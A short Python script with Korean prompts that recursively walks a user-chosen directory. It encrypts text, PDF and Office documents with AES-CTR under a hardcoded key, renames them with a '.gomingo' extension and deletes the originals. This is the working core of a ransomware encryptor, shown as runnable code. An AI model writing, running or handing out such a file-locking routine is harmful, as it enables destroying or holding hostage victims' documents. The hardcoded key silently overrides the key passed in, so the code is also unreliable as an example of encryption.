from Crypto.Cipher import AES
from Crypto.Util import Counter
import os
import shutil

def encrypt_file(input_file, output_file, key):
    block_size = 16

    with open(input_file, 'rb') as f_in:
        plaintext = f_in.read()

    iv = os.urandom(block_size)

    counter = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))

    cipher = AES.new(key, AES.MODE_CTR, counter=counter)

    ciphertext = cipher.encrypt(plaintext)

    with open(output_file, 'wb') as f_out:
        f_out.write(iv + ciphertext)

def encrypt_and_delete_original(input_file, key):
    encrypted_file = input_file + '.gomingo'

    key = b'Sixteen byte key'  
    encrypt_file(input_file, encrypted_file, key)
    os.remove(input_file)

def encrypt_files_in_directory(directory, extensions, key):
    for root, _, files in os.walk(directory):
        for filename in files:
            if any(filename.endswith(extension) for extension in extensions):
                input_file = os.path.join(root, filename)
                encrypt_and_delete_original(input_file, key)

if __name__ == '__main__':
    directory = input('암호화할 파일이 있는 최상위 디렉토리 경로 입력: ')  
    extensions = ['.txt', '.pdf', 'docx', '.pptx','.xlsx', ]  
    key = b'Sixteen byte key'  
    encrypt_files_in_directory(directory, extensions, key)
    print(f'{directory} 디렉토리와 하위 디렉토리 내의 파일을 성공적으로 암호화하고 삭제했습니다.')